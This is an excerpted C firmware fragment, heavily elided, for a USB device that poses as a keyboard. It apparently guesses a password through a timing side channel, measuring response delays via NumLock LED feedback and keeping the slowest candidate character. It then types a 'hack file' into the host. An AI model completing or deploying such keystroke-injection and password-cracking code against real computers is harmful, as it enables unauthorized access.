...
uint32_t timechars[85] = {0};
uint8_t characterSent = 1;
    ...
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    ...
    if (!password_correct_flag)
    {
        ...
        else
        {
            ...
            else if (password_index == password_tail)
            {
            ...
            else if (password_index == password_tail + 1){
                // pc wait loop
                 //for (uint32_t pcWait = 0; pcWait < 800000; pcWait++)
                   //  ;
    ...
    else //send hack file
    {
		...
		if(characterSent2) {
			...
			report->Modifier = requires_shift(hack[hackIndex]) ? HID_KEYBOARD_MODIFIER_LEFTSHIFT : 0;
            report->Reserved = 0;
            report->KeyCode[0] = translate_char(hack[hackIndex]); 
			characterSent2 = 1;
            hackIndex++;
		    }
	    }
    ...
    const uint16_t ReportSize)
{
    ...
    if (*report & HID_KEYBOARD_LED_NUMLOCK)
    {
        ...
        timechars[test_index] += elapsed_time;
        ...
        if (test_index >= strlen(pwchars)) {
            if (roundIndex == 1){
                ...
                test_index = 0;
                for (int timeIterator = 0; timeIterator < strlen(pwchars); timeIterator++) {
                    if (timechars[timeIterator] > best_time) {
                            best_char = pwchars[timeIterator];
                            best_time = timechars[timeIterator];}
                    timechars[timeIterator] = 0;
                }
